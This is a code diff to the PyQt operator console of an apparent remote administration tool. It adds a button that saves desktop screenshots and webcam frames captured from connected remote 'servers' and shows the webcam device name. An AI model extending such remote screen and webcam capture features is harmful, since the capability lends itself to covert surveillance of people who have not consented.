@@ -77,6 +77,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # unlocked servers bank
         self.unlockedSockets = []
 
+        # current preview bits
+        self.current_bits = None
+
         # listen status
         self.acceptthreadState = False
 
@@ -131,6 +134,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # Panel Triggers
         self.updatePreviewButton.clicked.connect(self.get_desktop_preview)
         self.getWebcamButton.clicked.connect(self.get_webcam_preview)
+        self.screenSaveButton.clicked.connect(self.save_preview)
         self.unlockServerButton.clicked.connect(self.unlock_server)
         self.lockServerButton.clicked.connect(self.lock_server)
         self.quitServerButton.clicked.connect(self.lock_server)
@@ -313,6 +317,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 screen_bits = im.convert('RGBA')
                 self.previewLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(screen_bits)).scaled(
                         self.previewLabel.size(), Qt.KeepAspectRatio))
+                self.current_bits = screen_bits
+                self.screenSaveButton.setDisabled(False)
             except SyntaxError:
                 pass
 
@@ -325,10 +331,20 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 im = Image.fromstring('RGB', (int(webcam_info['width']), int(webcam_info['height'])),
                                       zlib.decompress(webcam_info['webcambits']), 'raw', 'BGR', 0, -1)
                 webcam_bits = im.convert('RGBA')
-                self.webcamLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(webcam_bits)).scaled(
-                    self.webcamLabel.size(), Qt.KeepAspectRatio))
+                self.previewLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(webcam_bits)).scaled(
+                    self.previewLabel.size(), Qt.KeepAspectRatio))
+                self.deviceNameLabel.setText(self.socks[server]['webcamdevice'])
+                self.current_bits = webcam_bits
+                self.screenSaveButton.setDisabled(False)
             except SyntaxError:
                 pass
+
+    def save_preview(self):
+        if self.current_bits:
+            file_name = QFileDialog.getSaveFileName(self, 'Save file', '', 'Image (*.png)')
+            windows_path = str(file_name).replace('/', '\\')
+            if file_name:
+                self.current_bits.save(windows_path, 'png')
 
     # Update Servers Table from self.socks
     def update_servers_table(self):
@@ -477,6 +493,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.unlockServerButton.setDisabled(True)
             self.updatePreviewButton.setDisabled(True)
             self.getWebcamButton.setDisabled(True)
+            self.screenSaveButton.setDisabled(True)
 
     def has_microphone(self):
         try:
